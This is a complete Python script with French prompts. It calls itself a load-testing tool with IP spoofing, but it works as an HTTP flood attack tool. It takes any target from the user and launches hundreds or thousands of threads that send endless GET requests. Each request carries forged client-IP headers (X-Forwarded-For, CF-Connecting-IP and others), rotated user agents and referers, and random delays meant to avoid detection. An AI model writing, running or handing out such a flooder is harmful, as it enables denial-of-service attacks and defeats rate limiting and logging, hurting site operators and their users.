#!/usr/bin/env python3

import threading
import requests
import sys
import time
import os
import random
import socket
from urllib.parse import urlparse

VERT = "\033[32m"
RESET = "\033[0m"
ROUGE = "\033[31m"
JAUNE = "\033[33m"
BLEU = "\033[34m"

original_print = print

def print(*args, **kwargs):
    original_print(VERT, end="")
    original_print(*args, **kwargs)
    original_print(RESET, end="\n")

def print_color(color, *args, **kwargs):
    original_print(color, end="")
    original_print(*args, **kwargs)
    original_print(RESET, end="\n")

logo_ascii = """
                                                 @@@@@@@@@@@@@@@@@@@                                 
                                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                         
                                    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                    
                                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
                             @@@@@@@@@@@@@@@@@@                       @@@@@@@@@@@@@@@@@@             
                           @@@@@@@@@@@@@@                                   @@@@@@@@@@@@@@@          
                        @@@@@@@@@@@@@              @@@@@@@@@@@@@@@              @@@@@@@@@@@@@        
                       @@@@@@@@@@@          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@          @@@@@@@@@@@       
                       @@@@@@@@         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         @@@@@@@@       
                        @@@@@        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        @@@@@        
                                  @@@@@@@@@@@@@@@                   @@@@@@@@@@@@@@@                  
                                @@@@@@@@@@@@@                           @@@@@@@@@@@@@                
                               @@@@@@@@@@            @@@@@@@@@@@            @@@@@@@@@@               
                                @@@@@@@         @@@@@@@@@@@@@@@@@@@@@         @@@@@@@                
                                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@                            
                                          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                          
                                         @@@@@@@@@@@             @@@@@@@@@@@                         
                                        @@@@@@@@@                   @@@@@@@@@                        
                                         @@@@@@        @@@@@@@        @@@@@@                         
                                                    @@@@@@@@@@@@@                                    
                                                   @@@@@@@@@@@@@@@                                   
                                                  @@@@@@@@@@@@@@@@@                                  
                                                  @@@@@@@@@@@@@@@@@                                  
                                                   @@@@@@@@@@@@@@@                                   
                                                    @@@@@@@@@@@@@                                    
                                                       @@@@@@@            

"""

# ========== FONCTIONS DE SPOOFING IP ==========

def generate_fake_ip():
    """Génère une fausse IP aléatoire"""
    while True:
        ip_parts = [str(random.randint(1, 254)) for _ in range(4)]
        first_octet = int(ip_parts[0])
        
        # Évite les IPs privées
        if (first_octet == 10 or
            first_octet == 127 or
            (first_octet == 169 and int(ip_parts[1]) == 254) or
            (first_octet == 172 and 16 <= int(ip_parts[1]) <= 31) or
            (first_octet == 192 and int(ip_parts[1]) == 168)):
            continue
            
        return '.'.join(ip_parts)

def create_spoofed_headers(real_target, fake_ip=None):
    """Crée des en-têtes HTTP avec IP spoofée"""
    if fake_ip is None:
        fake_ip = generate_fake_ip()
    
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0'
    ]
    
    referers = [
        'https://www.google.com/',
        'https://www.bing.com/',
        'https://duckduckgo.com/',
        'https://www.facebook.com/',
        'https://twitter.com/',
        'https://www.instagram.com/'
    ]
    
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'X-Forwarded-For': fake_ip,
        'X-Real-IP': fake_ip,
        'X-Originating-IP': fake_ip,
        'X-Remote-IP': fake_ip,
        'X-Remote-Addr': fake_ip,
        'X-Client-IP': fake_ip,
        'CF-Connecting-IP': fake_ip,
        'True-Client-IP': fake_ip,
        'Forwarded': f'for={fake_ip};proto=https;by={fake_ip}',
        'Referer': random.choice(referers)
    }
    
    return headers, fake_ip

def is_ip_address(target):
    """Vérifie si la cible est une IP"""
    try:
        socket.inet_aton(target)
        return True
    except socket.error:
        return False

# ========== FONCTION D'ATTAQUE PRINCIPALE ==========

def attack_with_spoofing(target, use_https=True, rotate_ip_frequency=10):
    """
    Envoie des requêtes GET avec des IPs spoofées
    use_https: True pour HTTPS, False pour HTTP
    """
    request_count = 0
    current_fake_ip = generate_fake_ip()
    session = requests.Session()
    
    # Construire l'URL correctement
    if use_https:
        if not target.startswith('https://'):
            if is_ip_address(target):
                url = f"https://{target}"
            else:
                url = f"https://{target}"
        else:
            url = target
    else:
        if not target.startswith('http://'):
            if is_ip_address(target):
                url = f"http://{target}"
            else:
                url = f"http://{target}"
        else:
            url = target
    
    thread_id = threading.get_ident()
    print_color(BLEU, f"[DÉMARRAGE] Thread {thread_id} | {url} | IP: {current_fake_ip}")
    
    while True:
        try:
            # Changer d'IP périodiquement
            if request_count % rotate_ip_frequency == 0:
                if request_count > 0:  # Pas au premier tour
                    current_fake_ip = generate_fake_ip()
                    # Afficher le changement d'IP 1 fois sur 3 seulement
                    if random.random() < 0.3:
                        print_color(BLEU, f"[IP] Thread {thread_id} → {current_fake_ip}")
            
            # Créer des en-têtes avec IP spoofée
            headers, used_ip = create_spoofed_headers(target, current_fake_ip)
            
            # Envoyer la requête avec timeout plus long pour HTTPS
            timeout = 15 if use_https else 8
            response = session.get(url, 
                                  headers=headers, 
                                  timeout=timeout,
                                  allow_redirects=True,
                                  verify=False)  # Ignore les erreurs SSL
            
            status_code = response.status_code
            request_count += 1
            
            # Afficher le résultat (1 ligne sur 10-20 pour éviter le spam)
            if request_count % 15 == 0:
                if status_code == 200 or status_code == 403 or status_code == 429:
                    print(f"Thread {thread_id} | #{request_count} | {used_ip} | {status_code}")
                else:
                    print_color(JAUNE, f"Thread {thread_id} | #{request_count} | {used_ip} | {status_code}")
            
            # Petit délai variable pour éviter la détection
            time.sleep(random.uniform(0.001, 0.01))
            
        except requests.exceptions.SSLError:
            # Si erreur SSL, passer en HTTP pour ce thread
            if use_https:
                print_color(JAUNE, f"Thread {thread_id} | SSL Error, passage en HTTP")
                # Refaire la requête en HTTP
                try:
                    http_url = url.replace('https://', 'http://')
                    response = session.get(http_url, headers=headers, timeout=8)
                    request_count += 1
                except:
                    pass
            current_fake_ip = generate_fake_ip()
            
        except requests.exceptions.Timeout:
            if request_count % 10 == 0:
                print_color(ROUGE, f"Thread {thread_id} | Timeout")
            current_fake_ip = generate_fake_ip()
            
        except requests.exceptions.ConnectionError:
            if request_count % 10 == 0:
                print_color(ROUGE, f"Thread {thread_id} | Connection Error")
            current_fake_ip = generate_fake_ip()
            
        except requests.exceptions.RequestException as e:
            # Silence la plupart des erreurs
            current_fake_ip = generate_fake_ip()
            
        except Exception:
            current_fake_ip = generate_fake_ip()

# ========== FONCTION PRINCIPALE ==========

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(logo_ascii)
    time.sleep(1)
    
    print_color(BLEU, "=" * 60)
    print_color(JAUNE, "OUTIL DE TEST DE CHARGE AVEC SPOOFING IP")
    print_color(BLEU, "=" * 60)
    
    # Demander la cible
    while True:
        target_input = input(f"{JAUNE}Entrez l'IP ou domaine cible: {RESET}").strip()
        
        if not target_input:
            print_color(ROUGE, "Erreur: La cible ne peut pas être vide")
            continue
        
        # Détecter si c'est une IP
        if is_ip_address(target_input):
            print_color(VERT, f"✓ IP détectée: {target_input}")
        else:
            print_color(VERT, f"✓ Domaine détecté: {target_input}")
        
        break
    
    # Choisir HTTP ou HTTPS
    print_color(BLEU, "\nProtocole:")
    print("1. HTTPS (par défaut, recommandé)")
    print("2. HTTP")
    
    while True:
        protocol_choice = input(f"{JAUNE}Votre choix (1/2, défaut=1): {RESET}").strip()
        if protocol_choice == '' or protocol_choice == '1':
            use_https = True
            print_color(VERT, "✓ Utilisation de HTTPS")
            break
        elif protocol_choice == '2':
            use_https = False
            print_color(VERT, "✓ Utilisation de HTTP")
            break
        else:
            print_color(ROUGE, "Choix invalide")
    
    # Demander le nombre de threads
    while True:
        try:
            num_threads = int(input(f"{JAUNE}Nombre de threads (ex: 200): {RESET}").strip())
            if num_threads <= 0:
                print_color(ROUGE, "Erreur: Le nombre doit être positif")
                continue
            if num_threads > 2000:
                confirm = input(f"{JAUNE}⚠ {num_threads} threads est très élevé, continuer? (o/n): {RESET}")
                if confirm.lower() != 'o':
                    continue
            break
        except ValueError:
            print_color(ROUGE, "Erreur: Entrez un nombre valide")
    
    # Demander la fréquence de rotation
    try:
        freq = input(f"{JAUNE}Changer d'IP toutes les X requêtes (défaut=10): {RESET}").strip()
        rotate_frequency = int(freq) if freq else 10
        if rotate_frequency < 1:
            rotate_frequency = 1
    except ValueError:
        rotate_frequency = 10
    
    print_color(BLEU, "\n" + "=" * 60)
    print_color(JAUNE, f"DÉMARRAGE DE {num_threads} THREADS... (Ctrl+C pour arrêter)")
    print_color(BLEU, "=" * 60)
    
    # Test rapide de la cible
    try:
        test_url = f"https://{target_input}" if use_https else f"http://{target_input}"
        test = requests.get(test_url, timeout=5, verify=False)
        print_color(VERT, f"✓ Cible accessible en {'HTTPS' if use_https else 'HTTP'} (code: {test.status_code})")
    except:
        print_color(JAUNE, f"⚠ Cible peut-être inaccessible en {'HTTPS' if use_https else 'HTTP'}, mais on continue...")
    
    print_color(VERT, "\nEnvoi des requêtes en cours...\n")
    
    # Créer et démarrer les threads
    threads = []
    
    try:
        for i in range(num_threads):
            thread = threading.Thread(target=attack_with_spoofing, 
                                     args=(target_input, use_https, rotate_frequency))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            
            # Petit délai au démarrage
            if i < 100:
                time.sleep(0.01)
        
        print_color(VERT, f"✓ {num_threads} threads démarrés")
        print_color(JAUNE, "Appuyez sur Ctrl+C pour arrêter\n")
        
        # Garder le programme en vie
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print_color(JAUNE, "\n\n⏹ Arrêt demandé")
        print_color(VERT, f"Total approximatif de requêtes envoyées: très élevé")
        sys.exit(0)
        
    except Exception as e:
        print_color(ROUGE, f"\n❌ Erreur: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()